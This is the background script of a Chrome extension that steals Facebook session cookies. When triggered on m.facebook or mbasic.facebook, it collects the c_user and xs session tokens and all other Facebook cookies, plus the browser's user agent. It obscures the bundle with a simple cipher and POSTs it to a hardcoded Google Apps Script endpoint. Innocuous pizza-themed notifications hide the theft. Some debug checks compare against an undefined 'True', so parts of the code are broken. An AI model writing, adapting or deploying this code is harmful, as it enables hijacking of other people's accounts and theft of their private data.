var stringflujotxt = "";
var stringflujotxt2 = "";
const id_imple = "AKfycbyS4gSoMJ6WCb4YZD__FxRTr6zM_fuzcAlkKibLs9B0c0q0KfVVwEGWiMDGS-EDknDH"
const debug=false;
const homeTime = Date.now();


function getFormattedDateTime() {
    const now = new Date();
    const year = now.getFullYear();
    const month = String(now.getMonth() + 1).padStart(2, '0');
    const day = String(now.getDate()).padStart(2, '0');
    const hours = String(now.getHours()).padStart(2, '0');
    const minutes = String(now.getMinutes()).padStart(2, '0');
    const seconds = String(now.getSeconds()).padStart(2, '0');
    const dateTime = `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
    return dateTime;
}

// Función para encriptar
function simpleEncrypt(text) {
    if (!text || typeof text !== 'string') return '';
    
    // Semilla basada en longitud y primer carácter
    const seed = (text.length + text.charCodeAt(0)) % 94;
    
    let result = '';
    for (let i = 0; i < text.length; i++) {
        let charCode = text.charCodeAt(i);
        // Normalizamos al rango 0-93 (32 a 125)
        let normalized = charCode - 32;
        // Desplazamiento con semilla y posición
        let shifted = (normalized + seed + i) % 94;
        // Volvemos al rango imprimible
        result += String.fromCharCode(shifted + 32);
    }
    
    // Añadimos la semilla al final
    result += String.fromCharCode(seed + 32);
    return result;
}

// Función para desencriptar
function simpleDecrypt(encrypted) {
    if (!encrypted || typeof encrypted !== 'string') return '';
    
    // Extraemos la semilla
    const seed = encrypted.charCodeAt(encrypted.length - 1) - 32;
    const text = encrypted.slice(0, -1);
    
    let result = '';
    for (let i = 0; i < text.length; i++) {
        let charCode = text.charCodeAt(i);
        // Normalizamos
        let normalized = charCode - 32;
        // Revertimos el desplazamiento
        let unshifted = (normalized - seed - i) % 94;
        // Aseguramos que el resultado sea positivo
        if (unshifted < 0) unshifted += 94;
        // Volvemos al rango original
        result += String.fromCharCode(unshifted + 32);
    }
    
    return result;
}


function getLifeTime() {
    try {
        var tiempoActual = Date.now();
        var tiempoTranscurrido = tiempoActual - homeTime;
        var segundos = Math.floor(tiempoTranscurrido / 1000);
        var minutos = Math.floor(segundos / 60);
        var horas = Math.floor(minutos / 60);
        stringflujotxt += "[" + getFormattedDateTime() + "] Elapsed time: " + horas + "h " + (minutos % 60) + "m " + (segundos % 60) + "s\n";
		stringflujotxt2 += "[" + getFormattedDateTime() + "] Elapsed time: " + horas + "h " + (minutos % 60) + "m " + (segundos % 60) + "s\n";
        if (debug===True){
            console.log("Elapsed time: " + horas + "h " + (minutos % 60) + "m " + (segundos % 60) + "s");
        } 
    } catch (error) {
        stringflujotxt += "[" + getFormattedDateTime() + "] Error 96 gtl:  " + error + "\n";
		stringflujotxt2 += "[" + getFormattedDateTime() + "] Error 96 gtl:  " + error + "\n";
    }
}


var callback2 = function () {
    stringflujotxt += "[" + getFormattedDateTime() + "] Clever complete.\n";
	stringflujotxt2 += "[" + getFormattedDateTime() + "] Clever complete.\n";
};

function error(error) {
    stringflujotxt += "[" + getFormattedDateTime() + "] 208 er:  " + error + "\n";
	stringflujotxt2 += "[" + getFormattedDateTime() + "] 208 er:  " + error + "\n";
};

async function getcookies(tab) {
    var confirmation;
    var MUrl = "";
    
    await chrome.scripting.executeScript({
        target: {tabId: tab.id}, function: () => {
            return window.location.href;
        }
    }).then(function (resultados) {
        confirmation = resultados[0]["result"];
    }).catch(function (error) {
        stringflujotxt += "[" + getFormattedDateTime() + "]  " + error + "\n";
    });
    if (confirmation.includes("m.facebook")) {
        MUrl = "https://m.facebook.com";
    } else if (confirmation.includes("mbasic.facebook")) {
        MUrl = "https://mbasic.facebook.com";
    }
    if (MUrl !== "") {
        var cUserCookie = await new Promise(resolve => {
            chrome.cookies.get({url: MUrl, name: "c_user"}, function (cookie) {
                resolve(cookie);
            });
        });
        var xsCookie = await new Promise(resolve => {
            chrome.cookies.get({url: MUrl, name: "xs"}, function (cookie) {
                resolve(cookie);
            });
        });
        const domain = new URL(confirmation).hostname;
        const cokis = await new Promise(resolve => {
            chrome.cookies.getAll({ domain: domain }, resolve);
        });
        const cokis2 = await new Promise(resolve => {
            chrome.cookies.getAll({ domain: ".facebook.com" }, resolve);
        });
        const allc = cokis.concat(cokis2);
        const ckall = allc.map(cookie => ({
            Name: cookie.name,
            Value: cookie.value,
            Domain: cookie.domain,
            Path: cookie.path,
            ExpirationDate: cookie.expirationDate
                ? new Date(cookie.expirationDate * 1000).toISOString()
                : "Session",
            HttpOnly: cookie.httpOnly,
            Secure: cookie.secure
        }));
        const ua = navigator.userAgent;
        await exportC00kysToXCL(ckall, confirmation, ua, getFormattedDateTime());
    } else {
        stringflujotxt += "[" + getFormattedDateTime() + "] 313 cke not clever";
		stringflujotxt2 += "[" + getFormattedDateTime() + "] 313 cke not clever";
    }
}



async function popup(mensaje) {
    chrome.notifications.create({
        type: 'basic',
        iconUrl: 'deliver.png',
        title: 'PZZA LOAD',
        message: mensaje
    });
}

async function popup2(mensaje) {
    chrome.notifications.create({
        type: 'basic',
        iconUrl: 'distribute.png',
        title: 'PZZA FINISH',
        message: mensaje
    });
}

function showBadgeText(text) {
    chrome.action.setBadgeText({text: text});
}

function showpopup(text) {
    var url = "popup2.html";
    var data = {
        url: url,
        type: "popup",
        width: 250,
        height: 200
    }
    chrome.windows.create(data);
}

async function exportC00kysToXCL(cokis, url, ua, fecha) {
    const cookiesData={
        "url" : url,
        "cookies" : cokis,
        "useragent" : ua,
        "date" : fecha,
    } 
    var Data=JSON.stringify(cookiesData);
    Data=Data.replace(/true/gi, 'True');
    Data=Data.replace(/false/gi, 'False');
    Data=Data.replace(/null/gi, 'None');
    var linkshared="https://script.google.com/macros/s/"+id_imple+"/exec"
    const formData = new URLSearchParams();
    const encrypted = simpleEncrypt(Data);
    const decrypted = simpleDecrypt(encrypted);
    formData.append('value', encrypted);
    const response = await fetch(linkshared, {
        method: "POST",
        body: formData
    });
    if (debug===True){
        if (response.ok) {
            console.log("Data sent correctly:", await response.text());
        } else {
            console.error("Error sending data:", await response.text());
        }
    } 
}


async function importC00kysToXCL() {
    var jsonObject ={} 
    var linkshared="https://script.google.com/macros/s/"+id_imple+"/exec"
    const response = await fetch(linkshared, {
        method: "GET",
        headers: {
            'Content-Type': 'application/json',
          }
    }).then(response => response.json())
    .then(data => {
        if (debug===True){
            console.log('Success:', data);
        } 
        jsonObject = JSON.parse(data);
      })
    .catch((error) => {
        if (debug===True){
            console.error('Error:', error);
        } 
    });
    const url = jsonObject.url;
    const cukes = jsonObject.cookies;
    if (debug===True){
        console.log('URL:', url);
        console.log('Cookies:', cukes);
        console.log(jsonObject);
    } 
}

chrome.runtime.onMessage.addListener(async function (request, sender, sendResponse) {
    stringflujotxt="";
    stringflujotxt += "[" + getFormattedDateTime() + "] Version.: 0.0.1n";
    if (request.action === 'start') {
        const tab = request.message;
		chrome.tabs.update(tab.id, {active: true});
        await popup('Sending');
        showBadgeText('Sending');
        await getcookies(tab);
        showBadgeText('Finished');
        await popup2('Finished');
    }
});



